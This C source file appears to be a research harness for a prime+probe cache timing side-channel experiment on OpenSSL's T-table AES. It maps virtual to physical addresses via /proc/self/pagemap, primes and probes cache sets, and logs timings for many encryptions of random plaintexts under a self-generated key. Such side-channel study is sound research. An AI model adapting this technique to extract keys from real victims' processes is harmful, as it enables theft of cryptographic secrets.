#define _GNU_SOURCE
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#include <openssl/aes.h>
#include <openssl/evp.h>

#define NSETS 256
#define ASSOC 4

struct cache_block
{
    struct cache_block *next;
    uint64_t timing;
    uint64_t _pad[6];
} __attribute__ ((packed));

void init_probe_chase(struct cache_block *probe, int nsets)
{
    int i, j;
    for(i = 0; i < nsets; i++)
    {
        for(j = 0; j < ASSOC; j++)
        {
            if(j == ASSOC - 1)
                probe[i + NSETS * j].next = NULL;
            else
                probe[i + NSETS * j].next =
                    &probe[i + NSETS * (j + 1)];
        }
    }
}

#define PAGE_SHIFT     14
#define PAGEMAP_LENGTH 8

unsigned long get_pfn_for_addr(void *addr)
{
    unsigned long offset, pfn;
    FILE *pagemap = fopen("/proc/self/pagemap", "rb");
    offset = (unsigned long) addr / getpagesize() * PAGEMAP_LENGTH;

    if(fseek(pagemap, offset, SEEK_SET) != 0)
    {
        fprintf(stderr, "failed to seek pagemap to offset\n");
        exit(1);
    }

    fread(&pfn, 1, PAGEMAP_LENGTH - 1, pagemap);
    fclose(pagemap);

    pfn &= 0x7FFFFFFFFFFFFF;
    return pfn;
}

unsigned long virt_to_phys(void *addr)
{
    unsigned long pfn, page_offset, phys_addr;

    pfn = get_pfn_for_addr(addr);
    page_offset = (unsigned long) addr % getpagesize();
    phys_addr = (pfn << PAGE_SHIFT) + page_offset;

    return phys_addr;
}

extern void random_init();
extern void random_seed(uint8_t *expanded);
extern void aes_save(uint8_t *state);
extern void aes_load(uint8_t *state);

extern void prime(register struct cache_block *base);
extern void prime2(register struct cache_block *base, uint16_t *entropy);
extern void prime3(register struct cache_block *base);
extern void measure(struct cache_block *base);

void tally(struct cache_block *base, FILE *file)
{
    int i;
    uint64_t sum;
    struct cache_block *curr;

    for(i = 0; i < 256; i++)
    {
        sum = 0;
        curr = &base[i];

        while(curr != NULL)
        {
            sum += curr->timing;
            curr = curr->next;
        }

        fprintf(file, "%i", sum);
        if(i != 255)
            fprintf(file, ",");
    }

    fprintf(file, "\n");
    fflush(file);
}

#define SENTINEL    0x1000
#define REPRIME     10

void generate_prime_order(uint16_t *order)
{
    int set_used[NSETS] = {0},
        assoc_used[ASSOC] = {0},
        offset_used[NSETS * ASSOC] = {0},
        i = 0, j = 0, blah;

    // generate link
    while(i != NSETS)
    {
        blah = random() % NSETS;
        if(set_used[blah] == 0)
        {
            set_used[blah] = 1;
            order[(ASSOC + 1) * i] = (uint16_t) blah;

            memset(assoc_used, 0, sizeof(assoc_used));
            assoc_used[0] = 1;
            j = 1;

            while(j != ASSOC)
            {
                blah = random() % ASSOC;
                if(assoc_used[blah] == 0)
                {
                    assoc_used[blah] = 1;
                    order[(ASSOC + 1) * i + j] = blah;
                    j++;
                }
            }

            order[(ASSOC + 1) * i + j] = SENTINEL;
            i++;
        }
    }

    order[(ASSOC + 1) * i] = SENTINEL;

    j = 0;
    while(j != (NSETS * ASSOC * REPRIME))
    {
        blah = random() % (NSETS * ASSOC);
        if(offset_used[blah] != REPRIME)
        {
            offset_used[blah]++;
            order[(ASSOC + 1) * i + j + 1] = (uint16_t) blah;
            j++;
        }
    }

    order[(ASSOC + 1) * i + j + 2] = SENTINEL;
}

void generate_probe_order(uint8_t *order)
{
    int used[NSETS] = {0}, i = 0, blah;

    while(i != NSETS)
    {
        blah = random() % NSETS;
        if(used[blah] == 0)
        {
            used[blah] = 1;
            order[i] = (uint8_t) blah;
            i++;
        }
    }
}

static const unsigned char sbox[16][16] =
        {
                {0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76},
                {0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0},
                {0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15},
                {0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75},
                {0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84},
                {0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf},
                {0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8},
                {0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2},
                {0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73},
                {0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb},
                {0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79},
                {0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08},
                {0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a},
                {0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e},
                {0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf},
                {0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16}
        };

static const unsigned char rc_lookup[11] = {0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c};

void expand_key(unsigned char key[16], unsigned char key_sched[176], int n)
{
    int i, j, prev_key_base, key_base = 0;
    unsigned char val;
    memcpy(key_sched, key, 16);

    for (i = 1; i < n; i++)
    {
        prev_key_base = key_base;
        key_base = 16 * i;

        for (j = 0; j < 3; j++)
        {
            val = key_sched[prev_key_base + 13 + j];
            key_sched[key_base + j] = sbox[val >> 4u][val & 0xfu];
        }

        val = key_sched[prev_key_base + 12];
        key_sched[key_base + 3] = sbox[val >> 4u][val & 0xfu];

        key_sched[key_base] ^= rc_lookup[i - 1];

        for (j = 0; j < 4; j++)
        {
            key_sched[key_base + j] = key_sched[key_base + j] ^ key_sched[prev_key_base + j];
        }

        for (j = 4; j < 16; j++)
        {
            key_sched[key_base + j] = key_sched[key_base + j - 4] ^ key_sched[prev_key_base + j];
        }
    }
}

uint8_t expanded[176];
uint8_t aes_state[16] = {0};
uint8_t *victim;

void iterate(register struct cache_block *base,
                register EVP_CIPHER_CTX *en_ctx,
                register uint8_t *msg)
{
    register uint32_t i;
    const register unsigned int *te0 = get_Te0();
    register struct cache_block *curr, *next;
    int blah;
//    uint64_t start, end;

    random_init();
    random_seed(expanded);
    aes_load(aes_state);

    /* Get rid of T-table entries */
//    for(i = 0; i < 1024; i += 16)
//        __asm__ volatile ("dc civac, %0" :: "r" (&te0[i]));
//    __asm__ volatile ("dsb sy; isb sy");

    /* This call to prime() starts a critical section of sorts.
        It loads our probe array into memory - after that, until
        the call to measure returns, the only accesses to memory
        are from the victim's encryption process and our own
        probes to our own probe array. This should be maintained
        as much as possible. */

//    __asm__ volatile ("isb; mrs %0, cntpct_el0; isb" : "=r" (start));
    prime3(base);
//    __asm__ volatile ("isb; mrs %0, cntpct_el0; isb" : "=r" (end));
//    printf("prime3 took %lli\n", end - start);
//    exit(0);

    EVP_EncryptInit_ex(en_ctx, NULL, NULL, NULL, NULL);
    EVP_EncryptUpdate(en_ctx, msg, &blah, msg, 16);
//    EVP_EncryptFinal_ex(en_ctx, msg + encrypted, &encrypted);

//    for(i = 0; i < 256; i += 16)
//    {
//        if(i == 80) continue;
//        curr = &base[i];
//        __asm__ volatile ("dc civac, %0; dsb sy; isb sy" :: "r" (curr));
//    }

    measure(base);

    /* We've exited the critical section. At this point, we can
        tally the collected timings and access memory however
        we want again. */
    aes_save(aes_state);
}

#define __STR(x)    #x
#define STR(x)      __STR(x)

#define PLAINTEXTS  16384
#define DUPLICATE   16384
#define OUT_FNAME   "pp_fixed_out_" STR(PLAINTEXTS) "_" STR(DUPLICATE) "_bothrand"

void experiment(struct cache_block *base)
{
    int i, j;
    uint8_t msg[16] = {0x79, 0x5C, 0x7F, 0x8E, 0xA1, 0x1D, 0x0D, 0xD9, 0x6E, 0xA6, 0xA4, 0xD9, 0x80, 0xBE, 0xC2, 0x7F},
            key[16] = {0x2C, 0xF9, 0x89, 0x37, 0x76, 0x03, 0x51, 0x0E, 0xB6, 0x87, 0x7F, 0x7A, 0xC3, 0x5A, 0x3D, 0x45},
            seedkey[16] = {0}, msg_backup[16];

    srand(time(NULL));
    for(i = 0; i < 16; i++)
    {
        msg[i] = random();
        key[i] = random();
        seedkey[i] = random();
    }

    expand_key(seedkey, expanded, 11);

    //FILE *outfile = fopen(OUT_FNAME, "w+");
    FILE *outfile = stdout;

    EVP_CIPHER_CTX *en_ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER_CTX_init(en_ctx);
    EVP_EncryptInit_ex(en_ctx, EVP_aes_128_ecb(), NULL, key, NULL);


    for(i = 0; i < 16; i++)
        fprintf(outfile, "%02X", key[i]);
    fprintf(outfile, "\n");
    fflush(outfile);

    for(i = 0; i < PLAINTEXTS; i++)
    {
        fprintf(stderr, "plaintext %i\n", i);
        memcpy(msg_backup, msg, 16);

        for(j = 0; j < 16; j++)
            fprintf(outfile, "%02X", msg_backup[j]);
        fprintf(outfile, "\n");

        for(j = 0; j < DUPLICATE; j++)
        {
            iterate(base, en_ctx, msg);
            tally(base, outfile);

            if(j != DUPLICATE - 1)
                memcpy(msg, msg_backup, 16);
        }
    }
}

int main()
{
    uint64_t offs = 0;
    void *arr;
    struct cache_block *probe_base;

    mlock(get_Te0(), 1024);
    mlock(get_Te1(), 1024);
    mlock(get_Te2(), 1024);
    mlock(get_Te3(), 1024);

    offs = virt_to_phys((void *) get_Te0()) % (NSETS * sizeof(struct cache_block));
    fprintf(stderr, "offs = %i (%i cache sets)\n", offs, offs / sizeof(struct cache_block));

    arr = mmap(NULL, NSETS * ASSOC * sizeof(struct cache_block),
                PROT_READ | PROT_WRITE,
                MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE,
                -1, 0);
    mlock(arr, NSETS * ASSOC * sizeof(struct cache_block));

    probe_base = (struct cache_block *) (arr); //+ (offs & ~(sizeof(struct cache_block) - 1)));
    init_probe_chase(probe_base, NSETS);
    experiment(probe_base);

    munmap(arr, NSETS * ASSOC * sizeof(struct cache_block));
}
